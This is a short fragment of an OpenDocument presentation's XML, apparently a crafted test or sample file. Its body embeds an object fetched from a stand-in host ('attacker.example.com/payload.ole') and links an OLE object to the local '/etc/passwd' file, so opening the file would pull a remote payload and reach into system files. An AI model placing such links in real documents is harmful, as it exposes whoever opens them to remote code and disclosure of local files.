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 xmlns:presentation="urn:oasis:names:tc:opendocument:xmlns:presentation:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0">
  <office:body>
    <office:presentation>
      <draw:page draw:name="page1" draw:master-page-name="Default">
        <draw:frame draw:name="ObjFrame">
          <draw:object xlink:href="http://attacker.example.com/payload.ole" xlink:type="simple" xlink:show="embed"/>
          <draw:object-ole xlink:href="file:///etc/passw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>
  <office:master-styles>
    <style:master-page style:name="Default" style:page-layout-name="PL1">
      <text:p>Click to edit master title style</text:p>
    </style:master-page>
  </office:master-styles>
</office:document-styles>
</file>